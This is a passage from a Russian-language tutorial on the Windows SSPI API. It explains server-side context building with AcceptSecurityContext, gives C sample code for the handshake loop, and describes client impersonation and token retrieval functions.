Спе­шу заметить, что мы исполь­зуем здесь фун­кции `SendData()` и `RecvData()`. Это может быть любая фун­кция для вза­имо­дей­ствия, хоть сокеты WSA с их `WsaRecv()`, `WSASend()`, хоть `ReadFile()`, `WriteFile()`. SSP незави­сим от спо­соба переда­чи дан­ных, кон­текст мож­но выс­тро­ить хоть на голубях!

## Роль сервера

Пос­ле того как на кли­енте запуще­на фун­кция `InitializeSecurityContext()`, она не будет воз­вра­щать управле­ние до тех пор, пока сер­вер не запус­тит свою фун­кцию `AcceptSecurityContext()`:

```
KSECDDDECLSPEC SECURITY_STATUS SEC_ENTRY AcceptSecurityContext(
[in, optional] PCredHandle phCredential,
[in, optional] PCtxtHandle phContext,
[in, optional] PSecBufferDesc pInput,
[in] unsigned long fContextReq,
[in] unsigned long TargetDataRep,
[in, out, optional] PCtxtHandle phNewContext,
[in, out, optional] PSecBufferDesc pOutput,
[out] unsigned long *pfContextAttr,
[out, optional] PTimeStamp ptsExpiry
);
```

Здесь исполь­зуют­ся все те же парамет­ры, что и в `InitializeSecurityContext()`, кро­ме двух зарезер­вирован­ных и име­ни сер­вера. Понят­но, что в рас­смат­рива­емом слу­чае пос­леднее не нуж­но, так как эта фун­кция запус­кает­ся на самом сер­вере. Роль такая же — фун­кция дол­жна запус­кать­ся в цик­ле до тех пор, пока не вер­нет `SEC_E_OK`. У нее есть два отли­чия:

-   при пер­вом обра­щении к этой фун­кции у нас уже есть пер­вый блоб, получен­ный от кли­ента, поэто­му мы всег­да име­ем дело с вход­ным буфером (в отли­чие от `InitializeSecurityContext()`, где при пер­вом вызове ничего с вход­ным буфером не дела­ется);
-   в дан­ной фун­кции дей­ству­ют все те же тре­бова­ния к кон­тек­сту, что и у `InitializeSecurityContext()`, они ука­заны в [до­кумен­тации Microsoft](https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-acceptsecuritycontext).

Вро­де бы все оди­нако­вое, но получен­ный от этой фун­кции кон­текст обла­дает бОль­шими воз­можнос­тями, чем резуль­тат, получен­ный от `InitializeSecurityContext()`. Этот кон­текст мы смо­жем исполь­зовать для имперсо­нации кли­ента.

При­мер пос­тро­ения кон­тек­ста на сер­вере так­же дос­таточ­но прост:

```
BOOL ServerHandshakeAuth(CredHandle* phCredentials, PULONG plAttrbibutes, CtxtHandle* phContext) {
	BOOL fSuccess = FALSE;
	__try {
		SECURITY_STATUS ss;
		// Объявляем входной и выходной буфер
		SecBuffer secBufferOut[1];
		SecBufferDesc secBufDescriptorOut;
		SecBuffer secBufferIn[1];
		SecBufferDesc secBufferDescriptorIn;

		// Устанавливаем информацию о состоянии цикла
		BOOL fFirstPass = TRUE;
		ss = SEC_I_CONTINUE_NEEDED;

		while (ss == SEC_I_CONTINUE_NEEDED) {
			// Связь с клиентом
			// Получаем размер блоба
			ULONG lSize = 0;
			ULONG lTempSize = sizeof(lSize);
			ReceiveData(&lSize, &lTempSize);
			// Получаем блоб
			PBYTE pbTokenBuf = (PBYTE)malloc(lSize);
			ReceiveData(pbTokenBuf, &lSize);

			// Входной буфер указывает на блоб
			secBufferIn[0].BufferType = SECBUFFER_TOKEN;
			secBufferIn[0].cbBuffer = lSize;
			secBufferIn[0].pvBuffer = pbTokenBuf;

			// Входной BufDesc указывает на входной буфер
			secBufferDescriptorIn.cBuffers = 1;
			secBufferDescriptorIn.pBuffers = secBufferIn;
			secBufferDescriptorIn.ulVersion = SECBUFFER_VERSION;

			// Устанавливаем выходной буфер (SSPI выделит память для него)
			secBufferOut[0].BufferType = SECBUFFER_TOKEN;
			secBufferOut[0].cbBuffer = 0;
			secBufferOut[0].pvBuffer = NULL;
			// Выходной BufDesc указывает на выходной буфер
			secBufDescriptorOut.cBuffers = 1;
			secBufDescriptorOut.pBuffers = secBufferOut;
			secBufDescriptorOut.ulVersion = SECBUFFER_VERSION;

			// Функция управления блобом
			ss = AcceptSecurityContext(phCredentials, fFirstPass ? NULL : phContext, &secBufferDescriptorIn, *plAttrbibutes | ASC_REQ_ALLOCATE_MEMORY, SECURITY_NETWORK_DREP, phContext,
&secBufDescriptorOut, plAttrbibutes, NULL);

			// Первый проход больше не нужен
			fFirstPass = FALSE;

			// Если блоб выходной, то посылаем его
			if (secBufferOut[0].cbBuffer != 0) {
				// Связь с клиентом
				// Посылаем размер блоба
				SendData(&secBufferOut[0].cbBuffer, sizeof(ULONG));
				// Посылаем сам блоб
				SendData(secBufferOut[0].pvBuffer, secBufferOut[0].cbBuffer);

				// Освобождение выходного буфера
				FreeContextBuffer(secBufferOut[0].pvBuffer);
			} // Сидим в цикле, если ss == SEC_I_CONTINUE_NEEDED

			if (ss != SEC_E_OK) { // Окончательный результат
				__leave;
			}
			fSuccess = TRUE;
		}
	}
	__finally {
		// Если сбой, то освобождаем хендл полного контекста
		if (!fSuccess) {
			ZeroMemory(phContext, sizeof(*phContext));
		}
	}
	return (fSuccess);
}

// Соответственно, вызов выполняется вот так
if(!ServerHandshakeAuth(&hCredentials, &lAttributes, &hContext)){
		// Ошибка
}
ss = ImpersonateSecurityContext(&hContext);
if (ss != SEC_E_OK){
	__leave;
}

DeleteSecurityContext(&hContext);
FreeCredentialsHandle(&hCredentials);
```

## Использование полного контекста

Пос­ле того как у нас успешно отра­бота­ли фун­кции `AcceptSecurityContext()` и `InitializeSecurityContext()`, мы получим на сер­вере хендл пол­ного кон­теста. Его мож­но исполь­зовать сле­дующим обра­зом.

### Имперсонация

Фун­кция `ImpersonateSecurityContext` поз­воля­ет сер­веру оли­цет­ворять кли­ента с помощью хен­дла кон­тек­ста, ранее получен­ного вызовом `AcceptSecurityContext()` или `QuerySecurityContextToken()`. Фун­кция `ImpersonateSecurityContext()` дает сер­веру воз­можность выс­тупать от лица кли­ента при всех про­вер­ках прав дос­тупа:

```
KSECDDDECLSPEC SECURITY_STATUS SEC_ENTRY ImpersonateSecurityContext(
[in] PCtxtHandle phContext
);
```

### RevertSecurityContext()

Поз­воля­ет прек­ратить оли­цет­ворение вызыва­юще­го объ­екта и вос­ста­новить собс­твен­ный кон­текст безопас­ности:

```
KSECDDDECLSPEC SECURITY_STATUS SEC_ENTRY RevertSecurityContext(
[in] PCtxtHandle phContext
);
```

### Получение токена из контекста

С помощью этой фун­кции мы можем дос­тать токен поль­зовате­ля, кон­текст которо­го получен из фун­кции `AcceptSecurityContext()`:

```
KSECDDDECLSPEC SECURITY_STATUS SEC_ENTRY QuerySecurityContextToken(
[in] PCtxtHandle phContext,
[out] void **Token
);
```

# ВЫВОДЫ

То­кены — это один из стол­пов безопас­ности в сис­темах Windows. Сегод­ня ты получил пред­став­ление лишь об осно­вах работы с ними. Если инте­рес­но пог­рузить­ся глуб­же, то поп­робуй изу­чить огра­ничен­ные токены (`CreateRestrictedToken()`) и их осо­бен­ности.